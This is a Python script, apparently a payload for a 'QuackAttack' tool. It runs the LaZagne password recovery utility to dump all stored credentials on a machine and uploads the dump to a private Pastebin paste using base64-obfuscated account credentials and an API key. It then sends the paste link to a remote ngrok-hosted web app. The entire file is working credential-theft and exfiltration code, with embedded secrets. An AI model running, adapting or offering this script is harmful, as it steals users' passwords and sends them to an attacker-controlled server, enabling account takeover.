import base64
import glob
import platform
import requests
from subprocess import Popen, PIPE

webapp_url = "https://quackattack.ngrok.io"

def execute(cmd):
	p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
	stdout, stderr = p.communicate()

def exfiltrate(paste_text):
	hostname = platform.node()
	user_name = base64.b64decode("YWxhbnI5MTc=").decode("utf-8")
	password = base64.b64decode("VkdKeUhlaE13OGFOSzZ3").decode("utf-8")
	dev_key = base64.b64decode("NTk1MTlhYWM3MzJjM2YzZWJkYmI3MDE4MTQzODcyYmE=").decode("utf-8")
	data_format = "json"
	paste_name = hostname + "_dump"
	private = 2
	expire_date = "1D"
	url = "https://pastebin.com/api/api_post.php"
	login_url = "https://pastebin.com/api/api_login.php"

	if user_name != '' and password != '':
		login_payload = {
						"api_dev_key": dev_key,
						"api_user_name": user_name,
						"api_user_password": password
						}
		login_request = requests.post(login_url, login_payload)
		user_key = login_request.text
	else:
		user_key = ""

	payload = {
				"api_option": "paste",
				"api_user_key": user_key,
				"api_paste_private": private,
				"api_paste_name": paste_name,
				"api_paste_expire_date": expire_date,
				"api_paste_format": data_format,
				"api_dev_key": dev_key,
				"api_paste_code": paste_text,
				}
	request = requests.post(url, payload)
	return request.text

def main():
	execute("lazagne.exe all -oJ")
	if len(glob.glob("credentials*")) > 0:
		most_recent_dump = glob.glob("credentials*")[-1]
		dump_string = open(most_recent_dump, "r").read()
		pastebin_url = exfiltrate(dump_string)
		add_link_url = webapp_url + "/add_link.php"
		requests.post(add_link_url, json={"url": pastebin_url})

main()